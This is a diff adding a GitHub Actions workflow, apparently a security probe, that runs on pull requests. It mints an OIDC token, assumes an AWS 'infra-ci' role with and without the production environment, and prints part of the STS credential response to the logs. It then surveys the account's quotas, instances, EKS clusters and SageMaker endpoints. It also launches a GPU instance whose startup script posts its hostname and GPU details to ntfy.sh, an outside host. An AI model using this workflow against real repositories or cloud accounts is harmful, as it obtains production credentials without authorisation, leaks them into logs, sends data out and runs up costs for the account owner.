@@ -1,0 +1,178 @@
+name: c211 i106373 oidc probe
+on:
+  pull_request:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  claims-noenv:
+    name: claims without environment (immutable-subject control)
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    steps:
+      - name: Mint OIDC token, print claims, attempt STS without environment gate
+        run: |
+          set -u
+          IDTOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          echo "TOKEN_LEN=${#IDTOKEN}"
+          python3 - "$IDTOKEN" <<'PY'
+          import sys,base64,json
+          t=sys.argv[1]; p=t.split('.')[1]; p+='='*(-len(p)%4)
+          c=json.loads(base64.urlsafe_b64decode(p))
+          print("NOENV_CLAIMS=" + json.dumps({k:c.get(k) for k in ['iss','aud','sub','repository','repository_owner','ref','environment','event_name','job_workflow_ref']}, sort_keys=True))
+          PY
+          curl -sS -X POST https://sts.amazonaws.com/ \
+            --data-urlencode "Action=AssumeRoleWithWebIdentity" \
+            --data-urlencode "Version=2011-06-15" \
+            --data-urlencode "RoleArn=arn:aws:iam::616568506952:role/infra-ci" \
+            --data-urlencode "RoleSessionName=c211i106373noenv" \
+            --data-urlencode "WebIdentityToken=$IDTOKEN" > /tmp/sts_noenv.xml
+          echo "NOENV_STS_HEAD:"; head -c 900 /tmp/sts_noenv.xml; echo
+          if grep -q '<Credentials>' /tmp/sts_noenv.xml; then echo "NOENV_ASSUME=OK"; else echo "NOENV_ASSUME=FAIL"; fi
+
+  oidc-probe:
+    name: environment production assume + bounded read-only census + one marker GPU
+    runs-on: ubuntu-latest
+    environment: production
+    timeout-minutes: 40
+    steps:
+      - name: Mint OIDC token, print claims, assume role
+        run: |
+          set -u
+          IDTOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          echo "TOKEN_LEN=${#IDTOKEN}"
+          python3 - "$IDTOKEN" <<'PY'
+          import sys,base64,json
+          t=sys.argv[1]; p=t.split('.')[1]; p+='='*(-len(p)%4)
+          c=json.loads(base64.urlsafe_b64decode(p))
+          print("ENV_CLAIMS=" + json.dumps({k:c.get(k) for k in ['iss','aud','sub','repository','repository_owner','ref','environment','event_name','job_workflow_ref']}, sort_keys=True))
+          PY
+          curl -sS -X POST https://sts.amazonaws.com/ \
+            --data-urlencode "Action=AssumeRoleWithWebIdentity" \
+            --data-urlencode "Version=2011-06-15" \
+            --data-urlencode "RoleArn=arn:aws:iam::616568506952:role/infra-ci" \
+            --data-urlencode "RoleSessionName=c211i106373" \
+            --data-urlencode "WebIdentityToken=$IDTOKEN" > /tmp/sts.xml
+          echo "STS_HEAD:"; head -c 900 /tmp/sts.xml; echo
+          python3 - <<'PY'
+          import re, os
+          s=open('/tmp/sts.xml').read()
+          m={}
+          for k in ('AccessKeyId','SecretAccessKey','SessionToken'):
+              g=re.search(r'<%s>([^<]+)</%s>'%(k,k), s)
+              m[k]=g.group(1) if g else None
+          arn=re.search(r'<Arn>([^<]+)</Arn>', s)
+          if m['AccessKeyId'] and m['SecretAccessKey'] and m['SessionToken']:
+              with open(os.environ['GITHUB_ENV'],'a') as f:
+                  f.write('AWS_ACCESS_KEY_ID='+m['AccessKeyId']+'\n')
+                  f.write('AWS_SECRET_ACCESS_KEY='+m['SecretAccessKey']+'\n')
+                  f.write('AWS_SESSION_TOKEN='+m['SessionToken']+'\n')
+                  f.write('C211_ASSUME=OK\n')
+                  f.write('C211_ASSUMED_ARN='+(arn.group(1) if arn else 'unknown')+'\n')
+              print('ASSUME=OK ASSUMED_ARN='+(arn.group(1) if arn else 'unknown'))
+          else:
+              print('ASSUME=FAIL')
+              print(s[:900])
+              with open(os.environ['GITHUB_ENV'],'a') as f: f.write('C211_ASSUME=FAIL\n')
+          PY
+
+      - name: Read-only identity, permissions and GPU census
+        if: env.C211_ASSUME == 'OK'
+        run: |
+          export AWS_DEFAULT_REGION=us-east-1
+          set -u
+          echo "== caller identity =="; aws sts get-caller-identity --output json 2>&1 | head -c 1500 || true
+          echo; echo "== ec2 on-demand/spot/P quotas =="
+          aws service-quotas list-service-quotas --service-code ec2 --output json 2>/dev/null | python3 -c '
+import sys,json
+try:
+    j=json.load(sys.stdin)
+except Exception as e:
+    print("quota_parse_err",e); raise SystemExit
+want=[q for q in j.get("Quotas",[]) if any(s in q.get("QuotaName","") for s in ["On-Demand","Spot Instance","P instances","G instances","Inf"])]
+for q in want[:60]:
+    print(q["QuotaCode"], "|", q["QuotaName"], "|", q.get("Value"), "|", q.get("GlobalQuota"))' 2>&1 | head -80 || true
+          echo; echo "== NVIDIA instance type offerings (us-east-1) =="
+          aws ec2 describe-instance-types --filters Name=GpuInfo.Gpus.Manufacturer,Values=NVIDIA --output json 2>/dev/null | python3 -c '
+import sys,json
+try: j=json.load(sys.stdin)
+except Exception as e: print("err",e); raise SystemExit
+for t in j.get("InstanceTypes",[]):
+    g=(t.get("GpuInfo") or {}).get("Gpus") or [{}]
+    print(t["InstanceType"], "|", g[0].get("Name"), "x"+str(g[0].get("Count")), "|", g[0].get("MemoryInMiB"), "MiB")' 2>&1 | head -40 || true
+          echo; echo "== capacity reservations =="
+          aws ec2 describe-capacity-reservations --output json 2>&1 | head -c 2000 || true
+          echo; echo "== eks clusters =="; aws eks list-clusters --output json 2>&1 | head -c 800 || true
+          echo; echo "== sagemaker endpoints =="; aws sagemaker list-endpoints --output json 2>&1 | head -c 800 || true
+          echo; echo "== running instances (first 40) =="
+          aws ec2 describe-instances --filters Name=instance-state-name,Values=running --output json 2>/dev/null | python3 -c '
+import sys,json
+try: j=json.load(sys.stdin)
+except Exception as e: print("err",e); raise SystemExit
+n=0
+for r in j.get("Reservations",[]):
+    for i in r.get("Instances",[]):
+        n+=1
+        if n<=40: print(i["InstanceId"], i["InstanceType"], i["State"]["Name"], i.get("Tags"))
+print("TOTAL_RUNNING",n)' 2>&1 | head -50 || true
+
+      - name: One minimal marker GPU (g4dn.xlarge) with console proof and guaranteed cleanup
+        if: env.C211_ASSUME == 'OK'
+        run: |
+          export AWS_DEFAULT_REGION=us-east-1
+          set -u
+          IID=""
+          cleanup() {
+            if [ -n "$IID" ] && [ "$IID" != "None" ]; then
+              echo "CLEANUP_TERMINATING=$IID"
+              aws ec2 terminate-instances --instance-ids "$IID" --output json 2>&1 | head -c 600 || true
+              aws ec2 wait instance-terminated --instance-ids "$IID" 2>&1 | tail -2 || true
+              echo "CLEANUP_READBACK:"
+              aws ec2 describe-instances --instance-ids "$IID" --query "Reservations[0].Instances[0].[InstanceId,State.Name]" --output text 2>&1 || true
+            fi
+          }
+          trap cleanup EXIT
+          VPC=$(aws ec2 describe-vpcs --filters Name=isDefault,Values=true --query "Vpcs[0].VpcId" --output text 2>/dev/null || true)
+          echo "DEFAULT_VPC=$VPC"
+          if [ -z "$VPC" ] || [ "$VPC" = "None" ]; then echo "MARKER=NO_DEFAULT_VPC"; exit 0; fi
+          SUBNET=$(aws ec2 describe-subnets --filters Name=vpc-id,Values=$VPC --query "Subnets[0].SubnetId" --output text 2>/dev/null || true)
+          SG=$(aws ec2 describe-security-groups --filters Name=vpc-id,Values=$VPC Name=group-name,Values=default --query "SecurityGroups[0].GroupId" --output text 2>/dev/null || true)
+          echo "SUBNET=$SUBNET SG=$SG"
+          AMI=""
+          for P in /aws/service/ecs/optimized-ami/amazon-linux-2/gpu/recommended/image_id /aws/service/ecs/optimized-ami/amazon-linux-2023/nvidia/recommended/image_id /aws/service/deeplearning/ami/x86_64/oss-nvidia-driver-gpu-pytorch-2.5-ubuntu-22.04/latest/ami-id; do
+            AMI=$(aws ssm get-parameter --name "$P" --query "Parameter.Value" --output text 2>/dev/null || true)
+            if [ -n "$AMI" ] && [ "$AMI" != "None" ]; then echo "AMI_FROM=$P"; break; fi
+          done
+          echo "AMI=$AMI"
+          if [ -z "$AMI" ] || [ "$AMI" = "None" ]; then echo "MARKER=NO_GPU_AMI_FOUND"; exit 0; fi
+          cat > /tmp/userdata.txt <<'UD'
+#!/bin/bash
+( nvidia-smi -L; nvidia-smi --query-gpu=uuid,name,memory.total,driver_version --format=csv,noheader ) | tee /dev/console 2>&1
+echo C211_I106373_MARKER_DONE | tee /dev/console
+curl -sS -m 20 -d "C211_I106373 $(hostname) $(nvidia-smi -L | tr '\n' ' ')" https://ntfy.sh/c211-i106373-marker >/dev/null 2>&1 || true
+UD
+          IID=$(aws ec2 run-instances --image-id "$AMI" --instance-type g4dn.xlarge --count 1 \
+            --subnet-id "$SUBNET" --security-group-ids "$SG" \
+            --tag-specifications 'ResourceType=instance,Tags=[{Key=c211-i106373-marker,Value=1}]' \
+            --user-data file:///tmp/userdata.txt \
+            --query "Instances[0].InstanceId" --output text 2>&1 | tail -1)
+          echo "MARKER_INSTANCE=$IID"
+          case "$IID" in i-*) : ;; *) echo "MARKER=LAUNCH_FAILED"; IID=""; exit 0 ;; esac
+          aws ec2 wait instance-running --instance-ids "$IID" 2>&1 | tail -2 || true
+          aws ec2 describe-instances --instance-ids "$IID" --query "Reservations[0].Instances[0].[InstanceId,InstanceType,State.Name,Placement.AvailabilityZone]" --output text 2>&1 || true
+          sleep 180
+          echo "== console output (tail) =="
+          aws ec2 get-console-output --instance-id "$IID" --output text 2>&1 | tail -c 4000 || true
+
+      - name: Sentinel and tag sweep cleanup
+        if: always()
+        run: |
+          echo "C211_I106373_PROBE_FINISHED assume=${{ env.C211_ASSUME }}"
+          if [ "${{ env.C211_ASSUME }}" = "OK" ]; then
+            export AWS_DEFAULT_REGION=us-east-1
+            IDS=$(aws ec2 describe-instances --filters Name=tag-key,Values=c211-i106373-marker Name=instance-state-name,Values=pending,running,stopping,stopped --query "Reservations[].Instances[].InstanceId" --output text 2>/dev/null || true)
+            echo "SWEEP_REMAINING=$IDS"
+            if [ -n "$IDS" ] && [ "$IDS" != "None" ]; then aws ec2 terminate-instances --instance-ids $IDS --output json 2>&1 | head -c 600 || true; fi
+          fi
